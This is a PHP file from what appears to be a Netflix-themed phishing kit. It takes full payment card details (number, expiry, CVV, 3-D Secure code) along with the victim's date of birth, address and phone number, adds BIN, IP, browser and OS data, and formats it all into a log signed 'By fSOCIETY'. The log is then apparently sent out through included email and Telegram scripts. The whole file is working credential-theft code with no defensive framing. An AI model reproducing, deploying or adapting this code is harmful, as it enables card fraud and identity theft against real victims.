<?php


session_start();
include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];

$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$thDSecure = $_SESSION['thDSecure'] = $_POST['thDSecure'];


$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$zipCod = $_SESSION['zipCod'] = $_POST['zipCod'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);


$yagmai .= '
     [+]âââãð³ CC Billãââ[+]
[D.O.B ]  = '.$_SESSION['birthdate'].'
[Addres ]  = '.$_SESSION['addres'].'
[City ]  = '.$_SESSION['City'].'
[State]  = '.$_SESSION['State'].'
[zip Code]  = '.$_SESSION['zipCod'].'
[Phone ]  = '.$_SESSION['phoneNumber'].'
     [+]âââãCC INFOãââ[+]
[CardHolder Name]  = '.$_SESSION['NameOnCard'].'
[CC Number] = '.$_SESSION['cardnumber'].'
[Expiry Date ]   = '.$_SESSION['expdate'].'
[CVV ] = '.$_SESSION['Securitycode'].'
        [+]ââââãð³ Binãâââ[+] 
[Card Bank] = '.$_SESSION['bank_name'].' 
[Card type] = '.$_SESSION['bank_type'].' 
[Card brand]= '.$_SESSION['bank_brand'].' 
       [+]ââââãð» Systemãâââ[+]
[IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[TIME/DATE] ='.$InfoDATE.'
[BROWSER] = '.$browserTy_Version.' and '.$OS.'
';



$yagmail .= '
[+]ââââââââââââââââââãðNetflixðãââââââââââââââââââââ[+]
[+]ââââââââââââââââãð¤ Card Bill ãââââââââââââââ[+]
[D.O.B ]              = '.$_SESSION['birthdate'].'
[Addres ]             = '.$_SESSION['addres'].'
[ City ]               = '.$_SESSION['City'].'
[State ]              = '.$_SESSION['State'].'
[ zip Code ]              = '.$_SESSION['zipCod'].'
[ Phone ]              = '.$_SESSION['phoneNumber'].'
[+]ââââââââââââââââã Card INFO ãââââââââââââââ[+]
[ CardHolder Name]    = '.$_SESSION['NameOnCard'].'
[ Credit Card Number] = '.$_SESSION['cardnumber'].'
[ Expiry Date ]       = '.$_SESSION['expdate'].'
[ CVV ]               = '.$_SESSION['Securitycode'].'
[+]ââââââââââââââââãð³ Bin INFOãââââââââââââââââ[+]
[ Card Bank]          = '.$_SESSION['bank_name'].' 
[ Card type]          = '.$_SESSION['bank_type'].' 
[ Card brand]         = '.$_SESSION['bank_brand'].' 
[+]ââââââââââââââââãð» Systemãâââââââââââââââââ[+]
[ IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[ TIME/DATE] ='.$InfoDATE.'
[ BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]ââââââââââââââââãðNetflixðãâââââââââââââââââ[+]
[+]ââââââââââââââââãBy fSOCIETYðð¤¡ðãâââââââââââââââââ[+]

';

include("sand_email.php"); 
include("TelegramAPi.php");



?>


